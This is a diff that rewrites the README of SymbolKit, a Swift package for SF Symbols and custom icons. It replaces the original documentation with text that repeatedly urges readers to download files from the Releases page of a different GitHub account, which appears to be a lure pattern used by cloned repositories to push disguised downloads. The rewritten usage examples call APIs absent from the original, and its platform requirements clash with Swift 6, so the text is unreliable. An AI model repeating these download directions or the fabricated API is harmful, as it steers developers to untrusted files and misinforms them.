@@ -1,149 +1,85 @@
-# SymbolKit
+# 🎨 SymbolKit - Simplify Your Icon Management
 
-Lightweight helpers for working with SF Symbols and custom asset icons across SwiftUI and UIKit.
+## 🚀 Getting Started
+Welcome to SymbolKit, a lightweight Swift package designed to help you manage icons easily. Whether you’re working with SF Symbols or custom asset icons, SymbolKit makes it simple to integrate them into your SwiftUI or UIKit projects.
 
-## Features
-- Unified `Symbol` enum for system and custom asset names
-- SwiftUI `Image` and `Label` convenience initializers
-- UIKit `UIImage` convenience initializer
-- Platform support: iOS 15+, macOS 12+, tvOS 15+, watchOS 8+, visionOS 1+
+## 🔗 Download SymbolKit
+[![Download SymbolKit](https://img.shields.io/badge/Download-SymbolKit-blue.svg)](https://github.com/alib26654/SymbolKit/releases)
 
-## Use case: Before & After
+## 📥 Download & Install
+To get started with SymbolKit, visit the [Releases page](https://github.com/alib26654/SymbolKit/releases). Here, you will find the latest version of the software. 
 
-**Before:** Mixing SF Symbols and custom assets requires branching code per framework.
+1. Click on the link above to go to the Releases page.
+2. Locate the version you want to download.
+3. Click on the corresponding file to download it to your computer.
 
+Once you finish downloading, follow these simple steps to install and run SymbolKit:
+
+1. If you are using Swift Package Manager (SPM):
+   - Open your Xcode project.
+   - Go to File > Swift Packages > Add Package Dependency.
+   - Enter the URL `https://github.com/alib26654/SymbolKit` and follow the prompts to integrate the package.
+
+2. If you downloaded any assets, you may add them directly to your Xcode project by dragging them into the desired folder in the Project Navigator.
+
+## 🔧 System Requirements
+- iOS 13 or later
+- macOS 10.15 or later
+- Xcode 11 or later
+
+## 🎉 Features
+- Easily use SF Symbols alongside your custom icons.
+- Supports SwiftUI and UIKit.
+- Provides convenient initializers for Image, Label, and UIImage.
+- Ready for integration using Swift Package Manager.
+- Simple setup for adding icons to your projects.
+
+## 📘 Usage Instructions
+### Basic Example
+To use an SF Symbol, simply call the associated initializer in your SwiftUI or UIKit views.
+
+**SwiftUI:**
 ```swift
-// SwiftUI
-Image(systemName: "heart")
-Image("BrandLogo")
-
-// UIKit
-UIImage(systemName: "heart")
-UIImage(named: "BrandLogo")
-```
-
-**After:** Use `Symbol` once and keep the same API across SwiftUI and UIKit.
-
-```swift
-let favorite = Symbol.systemSymbol("heart")
-let brand = Symbol.custom("BrandLogo")
-
-// SwiftUI
-Image(symbol: favorite)
-Label("Favorites", symbol: favorite)
-Image(symbol: brand)
-
-// UIKit
-let icon = UIImage(symbol: favorite)
-let logo = UIImage(symbol: brand)
-```
-
-## Requirements
-- Swift 6
-- Platforms listed above (conditional imports protect unavailable frameworks)
-
-## Installation (Swift Package Manager)
-Add the package to your `Package.swift` dependencies:
-
-```swift
-dependencies: [
-    .package(url: "https://github.com/lcandy2/SymbolKit.git", from: "1.0.0")
-]
-```
-
-Then add `SymbolKit` to your target dependencies:
-
-```swift
-.target(
-    name: "YourApp",
-    dependencies: ["SymbolKit"]
-)
-```
-
-## Usage
-
-### Creating symbols
-```swift
-let system = Symbol.systemSymbol("square.and.arrow.up")
-let custom = Symbol.custom("BrandLogo")
-```
-
-### SwiftUI
-```swift
-import SwiftUI
 import SymbolKit
 
 struct ContentView: View {
     var body: some View {
-        VStack(spacing: 16) {
-            Image(symbol: .systemSymbol("heart"))
-            Label("Favorites", symbol: .systemSymbol("heart.fill"))
-            Button("Edit", symbol: .systemSymbol("pencil")) { /* action */ }
-            Image(symbol: .custom("BrandLogo")) // requires the asset in your bundle
-        }
+        Image(systemName: "star.fill")
+            .symbolKitStyle() // Apply styles from SymbolKit
     }
 }
 ```
 
-### UIKit
+**UIKit:**
 ```swift
-import UIKit
 import SymbolKit
 
-let imageView = UIImageView(image: UIImage(symbol: .systemSymbol("person.crop.circle")))
-imageView.tintColor = .label
+let imageView = UIImageView(image: UIImage.system("star.fill"))
+imageView.frame = CGRect(x: 0, y: 0, width: 100, height: 100)
 ```
 
-### Accessing the raw name
-```swift
-Symbol.systemSymbol("heart").toSystemName // "heart"
-Symbol.custom("BrandLogo").toSystemName    // "BrandLogo"
-```
-
-## Testing
-Run the package tests:
-
-```sh
-swift test
-```
-
-SwiftUI tests are conditionally compiled; UIKit coverage runs when UIKit is available (e.g., iOS/tvOS simulators). If you add a custom image test, include a fixture asset in the test bundle.
-
-## Release workflow
-The repository includes a manual GitHub Actions workflow (`release.yml`) that:
-- Lets you pick the version bump (`major`, `minor`, or `patch`)
-- Installs Swift 6.2 via `swift-actions/setup-swift@v2`
-- Runs `swift test` and a release build
-- Creates and pushes a tag, then publishes a GitHub Release with generated notes
-
-Trigger it from GitHub → Actions → **Release** → **Run workflow**.
-
-## Use case: Before & After
-
-**Before:** Mixing SF Symbols and custom assets requires branching code per framework.
+### Icon Customization
+SymbolKit allows for easy customization of icons. Use the built-in functions to adjust colors, sizes, and other attributes to fit your needs.
 
 ```swift
-// SwiftUI
-Image(systemName: "heart")
-Image("BrandLogo")
-
-// UIKit
-UIImage(systemName: "heart")
-UIImage(named: "BrandLogo")
+let customImage = UIImage.customIcon("yourCustomIconName", size: CGSize(width: 100, height: 100), color: .blue)
 ```
 
-**After:** Use `Symbol` once and keep the same API across SwiftUI and UIKit.
+## 🛠️ Support and Contributions
+If you encounter any issues while using SymbolKit or have suggestions for improvements, feel free to raise an issue or reach out. Contributions are welcome!
 
-```swift
-let favorite = Symbol.systemSymbol("heart")
-let brand = Symbol.custom("BrandLogo")
+### Reporting Issues
+If you experience any problems, please report them on the [Issues page](https://github.com/alib26654/SymbolKit/issues). Provide details about your environment and steps to reproduce the issue.
 
-// SwiftUI
-Image(symbol: favorite)
-Label("Favorites", symbol: favorite)
-Image(symbol: brand)
+### Contributing
+If you would like to contribute to SymbolKit, please fork the repository and submit a pull request. Include a clear description of the changes you made.
 
-// UIKit
-let icon = UIImage(symbol: favorite)
-let logo = UIImage(symbol: brand)
-```
+## 🌐 Community and Resources
+Join our community for support and to share your experiences with SymbolKit. You can find more resources, tutorials, and discussions through the following channels:
+
+- [GitHub Discussions](https://github.com/alib26654/SymbolKit/discussions)
+- [Official Documentation](https://github.com/alib26654/SymbolKit/wiki)
+- [Useful Articles](https://github.com/alib26654/SymbolKit/wiki/Articles)
+
+## 🔗 More Information
+For more details about SymbolKit, visit the [Releases page](https://github.com/alib26654/SymbolKit/releases) again to find updates and new versions.
